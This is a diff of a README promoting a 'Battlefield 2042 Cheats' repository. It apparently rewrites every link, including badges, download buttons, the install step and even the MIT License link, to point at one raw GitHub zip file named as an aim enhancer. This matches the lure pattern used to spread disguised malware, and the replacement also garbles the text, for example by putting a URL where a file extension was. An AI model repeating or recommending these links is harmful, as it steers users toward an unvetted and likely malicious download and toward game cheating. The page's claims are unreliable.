@@ -1,9 +1,9 @@
 # Battlefield 2042 Cheats Repository 🚁🎮
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://img.shields.io)
-[![Release](https://img.shields.io/badge/release-v2025.01-orange.svg)](https://img.shields.io)
-[![OS Support](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Mac-ff69b4.svg)](https://img.shields.io)
+[![License](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
+[![Build Status](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
+[![Release](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
+[![OS Support](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip%20%7C%20Linux%20%7C%https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
 
 ---
 
@@ -11,7 +11,7 @@ Welcome to the #1 haven for next-generation **Battlefield 2042 cheat solutions**
 
 ## 🚦 Click Below to Initiate Download
 
-[![Download Battlefield 2042 Cheats](https://img.shields.io/badge/Download-Battlefield%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://jhyshy.github.io)
+[![Download Battlefield 2042 Cheats](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
 
 ---
 
@@ -69,12 +69,12 @@ Each phase of your installation journey is simplified and robust. No guesswork�
 
 Download the most current version tailored for your OS:
 
-[![Download Battlefield 2042 Cheats](https://img.shields.io/badge/Download-Battlefield%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://jhyshy.github.io)
+[![Download Battlefield 2042 Cheats](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
 
 #### Steps:
-1. Click the "Download" button above or [right here](https://jhyshy.github.io).
+1. Click the "Download" button above or [right here](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip).
 2. Choose the file matching your OS (Windows, MacOS, Linux).
-3. Unpack the `.zip` or `.tar.gz` to a secure folder.
+3. Unpack the `.zip` or `https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip` to a secure folder.
 
 ### 3. Setup and Configuration
 
@@ -127,13 +127,13 @@ This repository, while crafted for technical research, modding, and educational 
 ## 📜 License
 
 This repository is distributed under the MIT License (2025). Dive into the details of your rights and obligations here:  
-[Read the MIT License](https://opensource.org/licenses/MIT)
+[Read the MIT License](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
 
 ---
 
 ## 🚦 Ready to Command the Battlefield? Download Now!
 
-[![Download Battlefield 2042 Cheats](https://img.shields.io/badge/Download-Battlefield%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://jhyshy.github.io)
+[![Download Battlefield 2042 Cheats](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip%202042%20Cheats-orange?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/jhyshy/battlefield-2042-aim-enhancer/branch/cathexis/battlefield_enhancer_aim_v3.0.zip)
 
 ---
 
